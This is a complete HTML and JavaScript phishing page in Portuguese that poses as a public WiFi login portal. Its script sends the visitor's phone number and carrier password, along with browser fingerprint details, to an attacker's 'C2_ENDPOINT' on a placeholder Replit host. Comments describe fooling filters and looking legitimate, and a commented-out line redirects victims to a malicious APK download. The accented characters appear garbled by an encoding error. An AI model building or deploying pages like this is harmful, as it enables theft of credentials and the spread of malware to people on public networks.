<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Conex칚o - WiFi P칰blico</title>
    
    <!-- Meta tags para SEO e engana칞칚o de filtros -->
    <meta name="description" content="Conecte-se  rede WiFi p칰blica de forma r치pida e segura.">
    <meta name="keywords" content="wifi, publico, gratuito, internet, conexao">
    <meta name="author" content="Servi칞o de Conectividade P칰blica">
    
    <!-- Favicon para parecer mais leg칤timo -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>游니</text></svg>">

    <style>
        /* CSS Reset e vari치veis para consist칡ncia */
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --danger-color: #dc3545;
            --light-gray: #f8f9fa;
            --dark-gray: #343a40;
        }
        *, *::before, *::after { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--light-gray); display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        /* Container principal com anima칞칚o sutil de entrada */
        .auth-container {
            background-color: white;
            padding: 2.5rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }

        .logo { font-size: 3rem; margin-bottom: 1rem; }
        h1 { color: var(--dark-gray); margin-bottom: 0.5rem; font-size: 1.75rem; }
        .subtitle { color: #6c757d; margin-bottom: 2rem; font-size: 0.9rem; }

        /* Estilo dos inputs com foco avan칞ado */
        .form-group { margin-bottom: 1.5rem; text-align: left; }
        .form-group label { display: block; margin-bottom: 0.5rem; color: var(--dark-gray); font-weight: 500; }
        .form-control {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #ced4da;
            border-radius: 6px;
            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }
        .form-control:focus { border-color: var(--primary-color); outline: 0; box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25); }

        /* Bot칚o com estados de carregamento e feedback */
        .btn {
            width: 100%;
            padding: 0.8rem;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
        }
        .btn-primary { background-color: var(--primary-color); color: white; }
        .btn-primary:hover { background-color: #0056b3; transform: translateY(-1px); }
        .btn-primary:disabled { background-color: #a0c3e8; cursor: not-allowed; transform: none; }
        
        /* Feedback din칙mico para o usu치rio */
        .feedback { margin-top: 1.5rem; font-size: 0.9rem; font-weight: 500; }
        .feedback.success { color: var(--success-color); }
        .feedback.error { color: var(--danger-color); }
    </style>
</head>
<body>
    <main class="auth-container">
        <div class="logo">游니</div>
        <h1>Portal de Conex칚o</h1>
        <p class="subtitle">Para garantir uma conex칚o segura, por favor, autentique-se com os dados da sua operadora.</p>
        
        <form id="authForm" novalidate>
            <div class="form-group">
                <label for="phone">N칰mero de Celular</label>
                <input type="tel" id="phone" class="form-control" placeholder="(XX) XXXXX-XXXX" required>
            </div>
            <div class="form-group">
                <label for="password">Senha da Operadora</label>
                <input type="password" id="password" class="form-control" placeholder="Sua senha" required>
            </div>
            <button type="submit" class="btn btn-primary" id="submitBtn">Gerar C칩digo de Acesso</button>
            <p id="feedback" class="feedback"></p>
        </form>
    </main>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('authForm');
            const submitBtn = document.getElementById('submitBtn');
            const feedbackEl = document.getElementById('feedback');
            
            // URL do seu servidor no Replit (ou outro servi칞o)
            const C2_ENDPOINT = 'https://SEU-PROJETO.replit.app/log';

            form.addEventListener('submit', async (e) => {
                e.preventDefault();

                const phone = document.getElementById('phone').value;
                const password = document.getElementById('password').value;

                // Estado de carregamento
                submitBtn.disabled = true;
                submitBtn.textContent = 'Processando...';
                feedbackEl.textContent = '';
                feedbackEl.className = 'feedback';

                try {
                    const response = await fetch(C2_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            phone,
                            password,
                            // Coleta de fingerprinting avan칞ado
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            platform: navigator.platform,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            timestamp: new Date().toISOString()
                        })
                    });

                    if (response.ok) {
                        feedbackEl.textContent = 'C칩digo enviado! Para ativar, instale nosso aplicativo de autentica칞칚o.';
                        feedbackEl.classList.add('success');
                        // L칩gica para redirecionar para o payload (APK) em 3 segundos
                        setTimeout(() => {
                            // window.location.href = 'https://URL-DO-SEU-APK/app.apk';
                            feedbackEl.textContent += ' Redirecionando...';
                        }, 3000);
                    } else {
                        throw new Error('Falha na autentica칞칚o com o servidor.');
                    }
                } catch (error) {
                    feedbackEl.textContent = 'N칚o foi poss칤vel conectar. Tente novamente mais tarde.';
                    feedbackEl.classList.add('error');
                    console.error('Erro no envio:', error);
                } finally {
                    // Restaura o estado do bot칚o
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Gerar C칩digo de Acesso';
                }
            });
        });
    </script>
</body>
</html>
